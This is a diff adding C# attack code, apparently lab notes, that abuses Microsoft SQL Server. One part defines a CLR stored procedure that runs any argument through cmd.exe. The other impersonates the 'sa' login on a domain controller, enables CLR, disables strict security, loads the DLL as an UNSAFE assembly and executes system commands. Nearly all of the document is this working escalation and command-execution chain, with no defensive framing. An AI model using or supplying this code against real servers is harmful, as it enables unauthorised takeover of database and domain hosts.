@@ -1,0 +1,97 @@
+# we will create a managed DLL by creating a new "Class Library (.NET Framework)" project.
+
+using System;
+using Microsoft.SqlServer.Server;
+using System.Data.SqlTypes;
+using System.Diagnostics;
+
+public class StoredProcedures
+{
+    [Microsoft.SqlServer.Server.SqlProcedure]
+    public static void cmdExec(SqlString execCommand)
+    {
+        Process proc = new Process();
+        proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
+        proc.StartInfo.Arguments = string.Format(@" /c {0}", execCommand);
+        proc.StartInfo.UseShellExecute = false;
+        proc.StartInfo.RedirectStandardOutput = true;
+        proc.Start();
+
+        SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", System.Data.SqlDbType.NVarChar, 4000));
+        SqlContext.Pipe.SendResultsStart(record);
+        record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());
+        SqlContext.Pipe.SendResultsRow(record);
+        SqlContext.Pipe.SendResultsEnd();
+
+        proc.WaitForExit();
+        proc.Close();
+
+    }
+}
+
+# Copy this assembly to C:\Tools folder of dc01
+
+------------------------------------------------------------------------------------------------------
+using System;
+using System.Data.SqlClient;
+
+namespace TestSqlConnect
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            String sqlServer = "dc01.corp1.com";
+            String database = "master";
+            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
+            SqlConnection con = new SqlConnection(conString);
+
+            String impersonateUser = "EXECUTE AS LOGIN = 'sa';";
+            String enable_options = @"use msdb;EXEC sp_configure 'show advanced options', 1;RECONFIGURE; EXEC sp_configure 'clr enabled',1;RECONFIGURE;EXEC sp_configure 'clr strict security', 0;RECONFIGURE;";
+            String creatAsm = "CREATE ASSEMBLY myAssembly FROM 'c:\\tools\\ClassLibrary1.dll' WITH PERMISSION_SET = UNSAFE;";
+            String creatPro = "CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];";
+            String exeCmd = "Exec cmdExec 'whoami'";
+
+            try
+            {
+                con.Open();
+                Console.WriteLine("Auth success!");
+            }
+            catch
+            {
+                Console.WriteLine("Auth failed");
+                Environment.Exit(0);
+            }
+
+            try
+            {
+                SqlCommand command = new SqlCommand(impersonateUser, con);
+                SqlDataReader reader = command.ExecuteReader();
+                reader.Close();
+
+                command = new SqlCommand(enable_options, con);
+                reader = command.ExecuteReader();
+                reader.Close();
+
+                command = new SqlCommand(creatAsm, con);
+                reader = command.ExecuteReader();
+                reader.Close();
+
+                command = new SqlCommand(creatPro, con);
+                reader = command.ExecuteReader();
+                reader.Close();
+
+                command = new SqlCommand(exeCmd, con);
+                reader = command.ExecuteReader();
+                reader.Read();
+                Console.WriteLine("Result of command is: " + reader[0]);
+                reader.Close();
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(e);
+            }
+            con.Close();
+        }
+    }
+}
